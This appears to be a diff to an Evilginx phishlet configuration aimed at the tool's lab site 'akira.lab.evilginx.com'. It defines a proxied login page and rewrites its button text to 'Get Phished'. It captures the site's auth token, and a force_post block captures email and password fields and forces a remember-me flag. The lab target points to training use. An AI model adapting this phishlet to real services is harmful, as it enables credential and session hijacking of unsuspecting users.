@@ -2,7 +2,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'akira', orig_sub: 'akira', domain: 'lab.evilginx.com', session: true, is_landing: true, auto_filter: true}
 sub_filters:
-#  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+ - {triggers_on: 'akira.lab.evilginx.com', orig_sub: 'akira', domain: 'lab.evilginx.com', search: '" Login "', replace: '" Get Phished "', mimes: ['text/javascript']}
 auth_tokens:
   - domain: 'akira.lab.evilginx.com'
     keys: ['token:always']
@@ -18,3 +18,11 @@ credentials:
 login:
   domain: 'akira.lab.evilginx.com' #domain used as the landing page.
   path: '/' #path to the login page.
+force_post:
+  path: '/api/v1/auth/login' #path to the login page.
+  search:
+  - {key: 'email', search: '(.*)'}
+  - {key: 'password', search: '(.*)'}
+  force:
+  - {key: 'remember_me', value: '1'}
+  type: 'post'
